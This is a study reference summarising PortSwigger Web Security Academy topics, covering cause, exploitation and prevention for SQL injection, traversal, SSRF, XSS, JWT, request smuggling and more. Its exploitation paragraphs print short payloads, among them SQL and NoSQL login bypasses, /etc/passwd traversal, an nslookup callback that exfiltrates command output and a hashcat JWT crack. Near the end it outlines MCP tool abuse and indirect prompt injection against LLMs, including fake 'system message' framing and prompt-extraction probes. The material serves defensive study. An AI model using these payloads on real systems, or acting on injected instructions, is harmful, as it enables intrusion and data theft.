# Web Security — Vulnerability Reference

Derived from the PortSwigger Web Security Academy topic index (`https://portswigger.net/web-security/all-topics`), crawled 2026-11-25.

Each entry covers: what the vulnerability is, how it arises (root cause), how it is exploited, and how it is prevented. This is a study reference, not an exhaustive exploit cookbook — the labs are where the practical work happens.

> **Framing that generalises:** almost everything below collapses into one of a handful of root causes — *data and syntax sharing a channel* (SQLi, NoSQLi, SSTI, command injection, deserialization), *path or URL built from untrusted input* (traversal, SSRF, XXE, upload), *a trust boundary that only exists in the designer's head* (access control, auth, business logic, client-side controls), *two components disagreeing about what a message means* (request smuggling, cache poisoning/deception, Host header, prototype pollution), and *untrusted data reaching a dangerous sink* (XSS, DOM, WebSockets). Learn the mechanism once and it transfers.

---

## Server-side topics

### 1. SQL injection (SQLi)

**What it is.** Interference with the queries an application makes to its database. Lets an attacker read rows they shouldn't (other users' records), modify or delete data, and sometimes reach OS-level compromise or DoS.

**How it arises.** SQL is built by concatenating untrusted input into query text, so input and syntax share the same channel. Injection can occur in `WHERE` predicates, `UPDATE` values, `INSERT` values, and in structural positions like `ORDER BY` or table/column names.

**How it's exploited.**
- Probe with `'` and watch for errors; compare `OR 1=1` against `OR 1=2` for boolean influence; use time delays and OAST callbacks for blind cases.
- Comment out the rest of a predicate: `category=Gifts'--` removes `AND released = 1`.
- Login logic subversion: username `administrator'--` with any password.
- Extract data with `' UNION SELECT username, password FROM users--`.
- When no output returns, use conditional errors, boolean response differences, timing, or DNS exfiltration (blind SQLi). Stored input re-used unsafely later is *second-order* injection.
- Enumerate schema via version queries and `information_schema`.

**Prevention.** Parameterised queries / prepared statements — the query text stays a hard-coded constant and input is bound as data. Parameters do not cover identifiers or `ORDER BY`, so allowlist those. Don't concatenate merely because a value is "trusted."

### 2. Authentication vulnerabilities

**What it is.** Flaws in confirming identity. Distinct from authorisation (what an authenticated user may do). Rated critical because a break gives the account's full capability — and an admin account can mean full application and infrastructure control.

**How it arises.** Two families: mechanisms too weak to resist brute force, and logic/coding flaws allowing outright bypass ("broken authentication"). Also design that leaks account existence through response differences.

**How it's exploited.**
- Brute-force usernames (target `administrator`, `it-support`, plus ordinary accounts for phishing) and passwords; craft candidate lists from knowledge of the password policy and how users react to it (e.g. `Password1` → `Password!1`).
- Username enumeration via response/status/timing differences.
- Defeat brute-force controls: account locking (DoS the real user), rate-limit bypass by IP rotation or header spoofing.
- Bypass 2FA: attack the post-password, pre-verification state to reach resources, brute-force short codes, replay or steal tokens.
- Abuse password reset flows (reset links, email delivery), "keep me logged in", password change without re-auth, and HTTP basic auth.

**Prevention.** Enforce strong password policy, rate limit and lock-out with sensible reset, keep enumeration responses identical (including timing), make 2FA mandatory for privileged roles and single-use, bind reset tokens tightly to user and expiry, and re-authenticate before sensitive changes.

### 3. Path traversal (directory traversal)

**What it is.** Reading arbitrary files on the server, or sometimes writing them, which can mean full server control.

**How it arises.** A filesystem path is built by appending user input to a base directory without validation or canonicalisation.

**How it's exploited.**
- `filename=../../../etc/passwd`; Windows accepts `..\..\..\windows\win.ini`.
- Bypass filters with absolute paths, nested sequences (`....//`), URL and double encoding (`%2e%2e%2f`, `%252e%252e%252f`), overlong encodings (`..%c0%af`), required-prefix tricks (`/var/www/images/../../../etc/passwd`), and null-byte truncation (`../../etc/passwd%00.png`).

**Prevention.** Avoid passing user input to filesystem APIs. Otherwise allowlist input or restrict to a safe character set, then canonicalise and verify the result still starts with the expected base directory (`getCanonicalPath().startsWith(BASE_DIR)`).

### 4. OS command injection (shell injection)

**What it is.** Execution of arbitrary OS commands on the host, usually compromising the application and often enabling lateral movement.

**How it arises.** Application code shells out to a system command with user input passed through unconverted — typically a legacy wrapper script taking arguments.

**How it's exploited.** Chain commands with shell separators (`&`, `&&`, `|`, `||`; `;` and newline on Unix). Recon with `whoami`, `uname -a`/`ver`, `ifconfig`/`ipconfig /all`, `netstat -an`, `ps -ef`/`tasklist`. When output is suppressed, use time delay (`& ping -c 10 127.0.0.1 &`), write into the web root, or DNS via OAST (`` & nslookup `whoami`.collab.net & ``). Break out of quoting with `"` or `'` first.

**Prevention.** Best: don't shell out — use platform APIs. Otherwise strict allowlisting (numeric-only, or alphanumerics with no syntax or whitespace). Escaping metacharacters is too error-prone to be the primary defence.

### 5. Business logic vulnerabilities

**What it is.** Design and implementation flaws that make the app behave in unintended ways. They abuse legitimate workflows and states developers never anticipated, so scanners rarely find them.

**How it arises.** Flawed assumptions about user behaviour: excessive trust in client-side controls, poor handling of unconventional input, domain complexity, undocumented assumptions between components.

**How it's exploited.** Category set: trusting client-side controls (prices, quantities, role fields), unconventional input, flawed behavioural assumptions, domain-specific abuse (rounding, refund logic), providing an encryption oracle, and email-address parser discrepancies. Impact ranges from trivia to auth bypass and financial loss.

**Prevention.** Understand the domain; avoid implicit assumptions about users and other components; re-verify state server-side and sanity-check values; document workflows, data flows and assumptions; watch dependencies and side effects.

### 6. Information disclosure

**What it is.** Unintentional leakage of sensitive data — other users' details, commercial data, or technical detail about the stack.

**How it arises.** Internal content shipped to production (developer comments), insecure configuration (debug pages, verbose errors, defaults), and flawed design (differential responses enabling enumeration).

**How it's exploited.** Read `robots.txt`, browse directory listings, mine comments and error messages, probe backup files and VCS history, provoke errors, fuzz, and correlate framework versions with known exploits. Small details often complete a larger attack.

**Prevention.** Define what counts as sensitive, audit and automate removal of comments, use generic error pages, disable debug and diagnostics in production, and trim unused third-party features.

### 7. Access control

**What it is.** Constraints on who or what may perform actions. Broken access control is common and frequently critical, because the rules are hand-written and easy to get wrong.

**How it arises.** Sensitive functionality reachable by direct URL; access state stored client-side (hidden fields, cookies, query strings); platform rules bypassed; URL-matching discrepancies (casing, Spring suffix matching, trailing slashes); controls on some workflow steps but not others; trust in `Referer` or geolocation; and IDOR, where user-supplied identifiers fetch objects directly.

**How it's exploited.** Guess or discover admin endpoints (URLs leak in `robots.txt` and JavaScript — obscurity is not control); tamper with `id=`; switch methods; append `.anything` or slashes; skip earlier workflow steps and post straight to the final one; forge `Referer`; use a VPN to satisfy geo checks. Horizontal access that exposes admin functions becomes vertical escalation.

**Prevention.** Deny by default; one application-wide enforcement mechanism; explicit per-resource permission declarations; no reliance on obfuscation; audit and test every role and every step.

### 8. File upload vulnerabilities

**What it is.** Accepting files without adequate checks on name, type, content or size — up to remote code execution via web shells.

**How it arises.** Flawed or bypassable validation: extension blacklists that miss alternatives, trust in the `Content-Type` header, inconsistent validation across hosts and directories.

**How it's exploited.** Upload a PHP/JSP/ASP shell and invoke it for command execution. Change `Content-Type` to an image type and keep the script. Bypass extension filters with `.php5`/`.shtml`, `.htaccess`/`web.config` remapping, case (`exploit.pHp`), double extensions (`exploit.php.jpg`), trailing dot/space, `%2E`, `;.jpg`, null bytes, or non-recursive stripping (`exploit.p.phphp`). Use traversal in `filename` to land outside the intended directory. Uploaded HTML/SVG gives stored XSS; XML gives XXE.

**Prevention.** Extension allowlist; reject traversal sequences; rename files; validate in temporary storage before moving into the permanent store; prefer a proven framework over custom validation.

### 9. Race conditions

**What it is.** Flaws in concurrent handling, where parallel requests collide in a window (the "race window", possibly milliseconds) and produce unintended state.

**How it arises.** Temporary intermediate states ("sub-states") during request processing; hidden multi-step sequences; sessions valid before MFA; per-session locking defeated by separate session tokens; objects briefly existing with uninitialised fields.

**How it's exploited.**
- **Limit overrun / TOCTOU:** reuse a discount, redeem a gift card repeatedly, over-withdraw, replay a CAPTCHA, bypass rate limits.
- **Multi-endpoint:** modify a basket between price validation and confirmation.
- **Single-endpoint:** two password resets in one session so the victim's ID pairs with the attacker's token.
- **Partial construction:** inject an empty/null value to match a not-yet-set security field.
- **Time-sensitive:** identical reset tokens derived from timestamps.

Detect by predicting collisions on security-critical endpoints, benchmarking sequentially, then sending in parallel via single-packet attack or last-byte sync, and watching for deviations.

**Prevention.** Keep data in one storage layer; make state changes atomic with transactions and datastore concurrency controls; add integrity constraints (unique columns) as depth; make sessions internally consistent; consider stateless encrypted client state where appropriate.

### 10. Server-side request forgery (SSRF)

**What it is.** Causing the server to make a request to a location the developer did not intend. It abuses the implicit trust granted to local-origin traffic.

**How it arises.** The app fetches a user-controlled URL without adequate validation, and access checks live elsewhere (front-end only), bind admin interfaces to other ports, or trust localhost.

**How it's exploited.** Target `127.0.0.1`/`localhost` to reach `/admin`; reach private internals like `192.168.0.68/admin`; hit cloud metadata for credentials. Evade filters with alternate loopback forms (`2130706433`, `017700000001`, `127.1`), an attacker domain resolving to loopback, encoding and case tricks, redirects (including `http`→`https`), and URL-syntax games (`@`, `#`, `expected-host.evil-host`). Blind SSRF (no response returned) is harder but can reach RCE; the `Referer` header is one surface.

**Prevention.** Robust URL parsing; allowlist permitted hosts and validate post-resolution; block link-local metadata unless required; re-validate after redirects; enforce control at the network layer too (egress rules, metadata v2 requiring a token).

### 11. XXE injection

**What it is.** Tampering with XML parsing to read server files or reach back-end systems; a common SSRF primitive.

**How it arises.** The XML spec contains powerful features — notably external entities — that parsers enable by default even when unused.

**How it's exploited.** Declare a `DOCTYPE` entity pointing at `file:///etc/passwd` and reference it in a returned field. Point an entity at an internal URL for SSRF. When nothing is reflected, use blind OAST against a Collaborator host, and mine error messages. Other surfaces: XInclude, SVG and file uploads, and switching the content type to `text/xml`.

**Prevention.** Disable external entity resolution and XInclude in the parser configuration. Most of the exposure disappears with those features off.

### 12. NoSQL injection

**What it is.** Interference with queries sent to a NoSQL database — auth bypass, data extraction, DoS, sometimes code execution.

**How it arises.** Unsanitised input reaches a query. Two classes: **syntax injection** (breaking query syntax) and **operator injection** (inserting operators like `$ne`, `$in`, `$regex`, `$where`).

**How it's exploited.** Fuzz with `'"`{ ;$Foo} $Foo \xYZ` and watch for errors. Test boolean influence (`' && 0 && 'x` vs `' && 1 && 'x`), force always-true (`'||'1'=='1`), and truncate trailing restrictions with a null byte. Bypass login with `{"username":{"$ne":"invalid"}}` or target admin via `{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}`; in URL form `username[$ne]=invalid`. Extract characters with `$regex` (`{"password":{"$regex":"^a.*"}}`) or `$where` JavaScript, and use `sleep(5000)` for timing.

**Prevention.** Validate and allowlist input; parameterise rather than concatenate; allowlist accepted keys to block operator injection.

### 13. API testing

**What it is.** Risks specific to APIs: excess attack surface, undocumented endpoints, and permissive binding of request data into internal objects.

**How it arises.** Forgotten or undocumented endpoints, multiple accepted methods/content types/parameters, framework auto-binding, and exposed documentation.

**How it's exploited.** Enumerate from docs, `/api`, `/swagger/index.html`, `/openapi.json`, and JavaScript; fuzz function names. Test every HTTP method against low-impact objects. Swap content types (JSON↔XML) to surface errors and logic differences. Fuzz for hidden parameters. Exploit **mass assignment** — add `isAdmin: true` to an update, comparing request against response to find bindable fields. Exploit parameter pollution against internal APIs.

**Prevention.** Protect and maintain documentation; allowlist methods; validate content type; generic errors; protect every version; allowlist updatable properties and blocklist sensitive ones.

### 14. Web cache deception

**What it is.** Tricking a victim's browser into requesting a private dynamic endpoint through a URL the cache mistakes for static, so the private response is stored and can be read by the attacker.

**How it arises.** Discrepancies between cache and origin parsers over extensions, static prefixes, delimiters, encoding or normalisation.

**How it's exploited.** Find a dynamic `GET` endpoint with sensitive data, then craft a URL the cache and origin disagree on: append an ignored extension (`/user/123/profile/wcd.css`), use an origin-only delimiter (`/profile;wcd.css`), encoded delimiters or null/newline/tab, or traversal into a static prefix (`/assets/..%2fprofile`). Send it to the victim, then fetch it from the cache. Always use a cache buster when testing.

**Prevention.** `Cache-Control: no-store, private` on dynamic resources; stop CDN rules overriding it; enable CDN anti-deception checks; ensure origin and cache normalise identically.

---

## Client-side topics

### 15. Cross-site scripting (XSS)

**What it is.** Injection of script into another user's browser, bypassing the same-origin policy so the attacker acts as the victim. Among the most frequent web vulnerabilities.

**How it arises.** Untrusted data reaches a response or the DOM unescaped. **Reflected** (from the current request), **stored** (persisted and served later), or **DOM-based** (assigned to a client-side sink such as `innerHTML`).

**How it's exploited.** Impersonate the user, perform their actions, steal data and credentials, deface, insert trojans. Use `alert()`/`print()` as proof. Impact scales with victim privilege — critical against admins.

**Prevention.** Strict allowlist input filtering; context-appropriate output encoding (HTML, URL, JS, CSS); `Content-Type` and `X-Content-Type-Options` on non-HTML responses; CSP as a backstop (often bypassable, so not primary).

### 16. Cross-site request forgery (CSRF)

**What it is.** Making a logged-in user perform an action unknowingly.

**How it arises.** Three conditions together: a worthwhile action, identity carried *only* by session cookie, and no unpredictable parameters — so the browser's automatic cookie attachment makes a forged request indistinguishable.

**How it's exploited.** An auto-submitting hidden form (or a single `<img>` for GET actions) on an attacker page pointed at the target; the victim's cookie rides along. Delivery via email, social media, or content planted where users browse.

**Prevention.** CSRF tokens — unique, secret, unpredictable, session-bound, validated server-side. SameSite cookies (`Lax`+). Referer validation as a weaker third layer. Modern exploitation targets flaws in these.

### 17. Cross-origin resource sharing (CORS)

**What it is.** A browser mechanism that relaxes the same-origin policy through a header exchange. Not itself a CSRF defence.

**How it arises.** Misconfiguration: reflecting arbitrary origins (especially with credentials), faulty whitelist parsing (suffix `hackersnormal-website.com`, prefix `normal-website.com.evil-user.net`), whitelisting `null`, trusting XSS-vulnerable subdomains, allowing plain-HTTP subdomains, and `*` on intranet resources.

**How it's exploited.** An attacker page issues a credentialed XHR and exfiltrates the response. A sandboxed `data:` iframe produces a `null` origin for null whitelists. TLS stripping supplies a spoofed page from a trusted HTTP origin; XSS on a trusted subdomain pulls secrets such as API keys.

**Prevention.** Exact origins for sensitive resources; no unvalidated reflection; avoid `null` and wildcards on internal networks; enforce auth server-side regardless.

### 18. Clickjacking (UI redressing)

**What it is.** Tricking the user into clicking actionable content on a hidden site overlaid beneath a decoy page. Requires real user action, so CSRF tokens do not help.

**How it arises.** Arises whenever a site can be framed.

**How it's exploited.** Overlay the target as an `opacity: 0` iframe positioned with `z-index`; prefill fields by GET; defeat frame busters with `sandbox="allow-forms"` without `allow-top-navigation`; chain clicks or carry a pre-identified DOM XSS payload.

**Prevention.** Server-side headers: `X-Frame-Options: DENY`/`SAMEORIGIN` (no `ALLOW-FROM` in modern Chrome/Safari), or preferably CSP `frame-ancestors 'none'`/`'self'`. Frame-buster scripts are bypassable, so headers plus layers.

### 19. DOM-based vulnerabilities

**What it is.** Client-side flaws where attacker data (a **source**) flows to a dangerous API (a **sink**) — "taint flow".

**How it arises.** Sources include location data, `document.cookie`, `document.referrer`, `window.name`, storage, and web messages. Sinks include `document.write()`, `innerHTML`, `window.location`, `eval()`, `WebSocket()`, `element.src`, `postMessage()`, `setRequestHeader()`, and more.

**How it's exploited.** Categories map to sinks: DOM XSS, open redirection, cookie/link/WebSocket-URL/Ajax-header/storage/Ajax manipulation, unsafe web-message handling, and DOM clobbering (injected anchors overwriting trusted globals).

**Prevention.** No universal fix — avoid letting untrusted sources alter sink values; otherwise client-side allowlist validation and context-appropriate sanitisation at the right point in the flow.

### 20. WebSockets

**What it is.** Persistent bidirectional connections; practically any web vulnerability can appear over them.

**How it arises.** Unsafe server-side input processing, blind flaws only visible out-of-band, attacker data relayed to others (XSS), misplaced trust in handshake headers (e.g. `X-Forwarded-For`), inherited session context, custom headers expanding surface, and unvalidated handshakes enabling cross-site WebSocket hijacking.

**How it's exploited.** Tamper with message contents (e.g. a chat message with `<img onerror=…>`); manipulate the handshake to expose surface or refresh tokens; connect cross-site to perform privileged actions or read victim data.

**Prevention.** Use `wss://`; hard-code the endpoint URL; CSRF-protect the handshake; treat data as untrusted in both directions.

---

## Advanced topics

### 21. Insecure deserialization

**What it is.** Deserializing attacker-controlled data ("object injection"), letting the attacker instantiate arbitrary available classes and inject harmful values.

**How it arises.** Underestimated risk; validation performed after deserialization; objects assumed trustworthy (including binary formats); huge reachable dependency graphs making every flow unsecurable.

**How it's exploited.** Substitute a different class; damage occurs during deserialization itself via **magic methods**; build or reuse documented **gadget chains**; alter attributes/types; PHAR deserialization; memory corruption. Outcomes: RCE, privilege escalation, file access, DoS.

**Prevention.** Don't deserialize untrusted input if avoidable. If you must, verify integrity (signature) *before* deserializing, prefer class-specific serialisation to limit exposed fields, and assume gadgets exist. Treat deserialization itself as the flaw.

### 22. MCP server vulnerabilities

**What it is.** Flaws in MCP servers — which are simply web APIs exposed to AI clients — arising from trust assumptions (AI arguments are safe, listing = enforcement, session ID = identity, dynamic OAuth clients are trustworthy).

**How it arises.** Tools reaching the same backend as the site; arguments trusted because "the AI generated them"; restrictions applied only to `tools/list`; template-filled resource URIs; leaked instructions; auth that falls back to a default identity; predictable session IDs; dynamic OAuth registration with loose redirect matching.

**How it's exploited.** Test tool arguments for SQLi, traversal, SSRF; pass another user's identifier to a tool that trusts arguments; call **hidden** tools by name; traverse resource URIs or use alternate schemes (`file://`, SSRF); inject via prompt arguments; fingerprint versions against known SDK bugs; send no token, a malformed token, or a predicted session ID; register with a trusted client *name* plus attacker `redirect_uri` to skip consent (PKCE doesn't stop it).

**Prevention.** Treat every tool/resource/prompt as a public API; derive the user from the token, never from an argument; authorise at call time; allowlist URI mappings; reject invalid tokens (no fallback identity); authenticate every request with secure random session IDs; exact-match redirect URIs; record consent against client ID.

### 23. Web LLM attacks

**What it is.** Attacking the LLM's privileged position — its data, API and user access — akin to SSRF with a model in the middle.

**How it arises.** Prompt injection; excessive agency (APIs reaching sensitive data); integrations calling functions without confirmation; indirect delivery via pages, emails and API output; unsanitised output flowing into other systems.

**How it's exploited.** Indirect prompt injection (hidden page or email text, dressed as `***important system message***` to defeat "ignore embedded instructions" advice); enumerate accessible APIs and chain classic bugs through them (traversal, SQLi); exfiltrate prompts or user data with completion probes (`Complete the sentence: username:`); markdown/JS output rendered into the browser for XSS.

**Prevention.** Treat LLM-reachable APIs as public and enforce controls in the backing services, not the model's judgement; sanitise training data; feed only lowest-privilege data; restrict external sources; don't rely on prompt-level restrictions.

### 24. GraphQL API vulnerabilities

**What it is.** Implementation and design flaws in GraphQL: introspection exposure, sensitive leakage, query tampering, CSRF — all on a single endpoint.

**How it arises.** Introspection enabled in production, over-broad schema, unsanitised arguments, missing limits, and missing content-type/CSRF controls.

**How it's exploited.** Find the endpoint with `query{__typename}`; probe common paths and methods. Unsanitised IDs leak unlisted objects. Introspect `__schema`, or use field suggestions when introspection is off. Bypass naive introspection blocks with whitespace/newlines or GET/form-encoded requests. Use **aliases** to send many operations in one request, bypassing request-count rate limits for bulk brute force; batch operations; CSRF GET/form-encoded queries when content type isn't checked.

**Prevention.** Disable introspection (or prune if public); disable suggestions; keep private fields out of the schema; depth/operation/byte limits and cost analysis; accept only JSON POST with validated content type plus a strong CSRF token.

### 25. Server-side template injection (SSTI)

**What it is.** Injecting native template syntax that the server evaluates — often reaching RCE. More dangerous than client-side injection because it runs back-end.

**How it arises.** User input is concatenated into the template rather than passed as data (`render("Dear " . $_GET['name'])`) — the same mistake as string-concatenated SQL. Also results from user-editable templates.

**How it's exploited.** Fuzz `${{<%[%'"}}%\` for exceptions. In plaintext context try `${7*7}`; in code context inject `<tag>`, then `}}<tag>`. Fingerprint the engine — `{{7*'7'}}` gives `49` in Twig, `7777777` in Jinja2. Escalate from file read to RCE and full compromise.

**Prevention.** Don't let users submit templates; prefer logic-less engines (Mustache); sandbox untrusted execution with dangerous modules removed (sandboxes are bypassable); otherwise assume RCE and isolate in a locked-down container.

### 26. Web cache poisoning

**What it is.** Getting a harmful response cached and served to other users — distributing XSS, script injection or open redirects. Two phases: provoke a dangerous response, then make sure it caches.

**How it arises.** The cache key covers only the request line and `Host`; all other inputs are **unkeyed** and can change the response without changing the key.

**How it's exploited.** Find unkeyed inputs by adding random values and diffing responses (Burp Comparer, Param Miner "Guess headers"). Use a unique cache buster to avoid collateral damage. Elicit a harmful response via unsanitised reflection or value reuse. Find a cacheable variant (extension, content type, route, status).

**Prevention.** Disable caching or limit it to static content; audit CDN/default headers and remove unneeded ones; rewrite requests rather than deleting key fields; reject fat `GET`s; patch client-side bugs even when they seem unexploitable.

### 27. HTTP Host header attacks

**What it is.** Abuse of the mandatory HTTP/1.1 `Host` header and related override headers.

**How it arises.** The flawed assumption that `Host` is not user-controllable, plus insecure infrastructure defaults.

**How it's exploited.** **Password reset poisoning** (absolute reset links built from `Host` point at the attacker domain); web cache poisoning; **routing-based SSRF** through proxies that route on `Host` without validation; auth bypass; virtual-host brute force. `X-Forwarded-Host` and similar override headers add surface.

**Prevention.** Prefer relative URLs, or configure the canonical domain; validate `Host` against an allowlist (e.g. `ALLOWED_HOSTS`); avoid or securely handle override headers; allowlist proxy forwarding targets; keep internal vhosts off the public path.

### 28. HTTP request smuggling

**What it is.** Desynchronising how a front-end and back-end server delimit requests, often via an HTTP/1 downgrade in front of an HTTP/2 site.

**How it arises.** Two message-length mechanisms — `Content-Length` (CL) and `Transfer-Encoding` (TE) — handled inconsistently. The spec says ignore CL when both are present, but servers disagree over TE support or accept obfuscated TE. Yields CL.TE, TE.CL and TE.TE classes.

**How it's exploited.** Send an ambiguous request so trailing bytes are parsed as the *next* request: zero-length chunk plus trailing data (CL.TE), reversed header trust (TE.CL), malformed TE (TE.TE). Consequences: bypassed access controls, stolen other-user requests, cache poisoning/deception, reflected XSS, request tunnelling.

**Prevention.** HTTP/2 end to end with no downgrade; normalise ambiguous requests at the front end; have the back end reject residual ambiguity and close the TCP connection; never assume a body is absent; drop connections after server exceptions.

### 29. OAuth authentication

**What it is.** Flaws in OAuth "log in with" implementations — client-side and provider-side.

**How it arises.** The spec is loose and optional-heavy, with little built-in security; safety depends on developer choices, and sensitive values cross the browser.

**How it's exploited.** Implicit flow: client trusts posted user ID and token with no binding check, so parameters can be swapped to impersonate anyone. Missing `state` enables login CSRF and account binding to the attacker's profile. Weak `redirect_uri` validation (prefix match, appended paths/queries/fragments, duplicates, `localhost`, obfuscation like `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`) leaks codes; traversal on whitelisted hosts plus an open redirect, XSS or `Referer` leak finishes the job. Unverified provider registration allows claiming a victim's email. Scope escalation at exchange or `/userinfo`.

**Prevention.** Whitelist exact callback URIs and validate each request; send and check `state`; require `redirect_uri` at back-channel code exchange; validate scope against the original grant; verify user details at registration; avoid implicit flow; audit any page usable as a redirect target.

### 30. JWT attacks

**What it is.** Submitting altered JWTs to bypass login and authorisation — privilege escalation and account takeover.

**How it arises.** Missing or incorrect signature verification; implicit trust in user-controllable header fields (`alg`, `jwk`, `jku`, `kid`) before verification; weak or default secrets.

**How it's exploited.** `decode()` instead of `verify()`; `alg: none` (note the trailing dot; try case/encoding variants); brute-force an HMAC secret offline (`hashcat -a 0 -m 16500 <jwt> <wordlist>`) and re-sign; `jwk` injection with your own keypair; `jku` pointing at your JWK Set, using URL-parsing quirks; `kid` traversal to `/dev/null` (sign with an empty string) or `kid` SQLi; `cty` for XXE/deserialization; `x5c` for self-signed injection; algorithm confusion.

**Prevention.** Current libraries with understood behaviour; robust verification handling unexpected algorithms and edge cases; strict `jku` host allowlist; traversal- and injection-safe `kid`; expiry, `aud`, no URL transport, and revocation support.

### 31. Prototype pollution

**What it is.** Adding arbitrary properties to a global JavaScript prototype, inherited by every object.

**How it arises.** A recursive merge of user input into an existing object without key validation, so `__proto__` assigns to the prototype instead of the object. Sources: query strings, hashes, `JSON.parse()` output, web messages. Needs a source, a sink and a gadget.

**How it's exploited.** Client-side: pollute something like `config.transport_url` to load an attacker script → DOM XSS. Server-side: polluted properties influence responses (status codes, charset) and chain to RCE through Node `child_process`.

**Prevention.** Sanitise property keys; block changes to prototype objects; use `Object.create(null)`; prefer safer APIs. Note direct properties shadow inherited ones.

---

## Supporting material

### 32. Essential skills

Four skills, dominated by **obfuscating attacks using encodings** — URL, double-URL, HTML, XML, Unicode, hex, octal, multiple encodings and SQL `CHAR()` — all leveraging decoding inconsistencies to evade filters. Also: using Burp Scanner during manual testing (specific requests, custom insertion points, non-standard structures), identifying unknown vulnerabilities via mystery labs, and learning with Burp AT.

### 33. Certification (Burp Suite Certified Practitioner)

The exam, its practice variant, and the process description. See `https://portswigger.net/web-security/certification`.

---

## Cross-cutting prevention summary

- **Parameterise everything** — SQL, NoSQL, OS calls, templates, LDAP/XPath. Keep syntax constant; bind data.
- **Canonicalise and confine paths and URLs** — then assert containment in the expected root.
- **Enforce authorisation server-side, per resource, deny by default** — never trust a hidden field, cookie, `Referer`, `Host`, or listing.
- **Encode on output, by context; sanitise on input by allowlist** — and never let LLM or model output skip that.
- **Define message boundaries unambiguously** — HTTP/2 end to end, identical normalisation at every tier.
- **Make state changes atomic** and re-verify across multi-step flows.
- **Minimise disclosure** — generic errors, no debug in production, trimmed defaults and headers.
- **Treat every new surface (API, MCP tool, WebSocket, GraphQL) as a public endpoint.**
- **Layer the controls** — headers, CSP, SameSite, tokens, egress rules — assuming each can be bypassed.
